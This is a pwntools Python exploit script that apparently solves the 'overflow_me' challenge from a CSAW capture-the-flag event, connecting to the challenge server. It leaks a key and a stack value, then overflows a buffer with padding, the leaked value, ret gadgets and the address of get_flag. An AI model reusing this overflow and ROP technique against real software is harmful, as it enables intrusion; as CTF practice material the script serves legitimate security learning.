#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './overflow_me_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc chals.ctf.csaw.io 21006'.split()

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    libc = ELF('')
    ld = ELF('')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None
    

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')


gdbscript = '''
b *(0x04013f3)
continue
'''.format(**locals())

p = start()
off = 88
off_1 = 64

# key
p.send(p64(exe.sym.secret_key))
p.recvuntil(b'Tell me its address'); p.recvline()
key = bytes.fromhex(p.recvline().strip().decode())
log.info(f'key: {key.hex()}')
p.send(key[::-1])

# val shit
p.recvuntil(b'A post')
leak = bytes.fromhex(p.recvline().strip().split()[-1].decode()[2:])

rop = ROP(exe)

log.info(f'leak: {leak.hex()}')
p.send(flat(
    b'a' * off_1,
    leak[::-1],
    rop.ret.address,
    rop.ret.address,
    rop.ret.address,
    rop.ret.address,
    rop.ret.address,
    exe.sym.get_flag,
    b'\n',
))

p.interactive()